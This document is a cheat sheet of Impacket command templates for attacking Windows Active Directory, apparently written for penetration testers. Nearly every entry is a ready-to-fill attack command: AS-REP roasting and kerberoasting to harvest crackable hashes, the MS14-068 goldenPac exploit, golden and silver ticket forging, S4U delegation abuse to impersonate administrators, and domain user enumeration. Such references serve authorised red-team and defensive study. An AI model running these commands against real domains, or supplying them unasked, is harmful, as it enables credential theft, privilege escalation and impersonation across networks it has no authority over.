# Impacket

% impacket, windows, kerberos, 88

## GetNPUsers without password to get TGT (ASREPRoasting)
#plateform/linux #target/remote #cat/ATTACK/EXPLOIT 
```
GetNPUsers.py <domain>/<user> -no-pass -request -format hashcat
```

## find delegation
#plateform/linux #target/remote #cat/RECON
```
findDelegation.py -dc-ip <dc_ip> '<domain>/<user>:<password>'
```

## GetNPUsers - attempt to list and get TGTs for those users that have the property ‘Do not require Kerberos preauthentication’ (ASREPRoasting)
#plateform/linux #target/remote  #cat/ATTACK/EXPLOIT 
```
GetNPUsers.py -dc-ip <dc_ip> <domain>/ -usersfile <users_file> -format hashcat
```

## GetUSERSPN - find Service Principal Names that are associated with a normal user account (kerberoasting)
#plateform/linux #target/remote  #cat/ATTACK/EXPLOIT 
```
GetUserSPNs.py -request -dc-ip <dc_ip> <domain>/<user>:<password>
```

## MS14-068 - goldenPac
#plateform/linux #target/remote  #cat/ATTACK/EXPLOIT 
```
goldenPac.py -dc-ip <dc_ip> <domain>/<user>:'<password>'@<target>
```

## Ticketer - tickets UNIX to Win

```
ticketConverter.py <ticket.ccache> <ticket.kirbi>
```

## Ticketer - tickets Win to Unix

```
ticketConverter.py <ticket.kirbi> <ticket.ccache>
```

## Ticketer - (golden ticket) - generate TGT/TGS tickets into ccache format which can be converted further into kirbi.
#plateform/linux #target/local  #cat/ATTACK/EXPLOIT
```
ticketer.py -nthash <nthash> -domain-sid <domain_sid> -domain <domain> <user>
```

## Ticketer - (silver ticket) - generate TGS tickets into ccache format which can be converted further into kirbi.
#plateform/linux #target/local  #cat/ATTACK/EXPLOIT
```
ticketer.py -nthash <nthash> -domain-sid <domain_sid> -domain <domain> -spn <SPN> <user>
```

## TicketConverter - convert kirbi files (commonly used by mimikatz) into ccache files used by impacket
#plateform/linux #target/local  #cat/UTILS
```
ticketConverter.py <ccache_ticket_file> <ticket_kirbi_file>
```

## Silver ticket - impersonate user
#plateform/linux #target/remote  #cat/ATTACK/EXPLOIT 
```
getST.py -spn cifs/<target> <domain>/<netbios_name>\$ -impersonate <user>
```

## Constrained deleg w/ protocol transition - impersonate user
#plateform/linux #target/remote  #cat/ATTACK/EXPLOIT 
```
getST.py -dc-ip <dc_ip> -spn cifs/<target> '<domain>/<user>:<password>' -impersonate <admin>
```

## S4U2Self - Get TGT of user of choice from local admin 
#plateform/linux #target/remote  #cat/ATTACK/EXPLOIT 
```
getST.py -self -impersonate "<admin_de_dom>" -spn "cifs/<dc>.<domain>" -k -no-pass -dc-ip <dc_ip> '<domain>'/'<dc>$'
```

## GetTGT - request a TGT and save it as ccache for given a password, hash or aesKey
#plateform/linux #target/remote  #cat/UTILS
```
getTGT.py -dc-ip <dc_ip> -hashes <lm_hash>:<nt_hash> <domain>/<user>
```

## GetADUser - gather data about the domain’s users and their corresponding email addresses
#plateform/linux #target/remote  #cat/RECON 
```
GetADUsers.py -all <domain>/<user>:<password> -dc-ip <dc_ip>
```
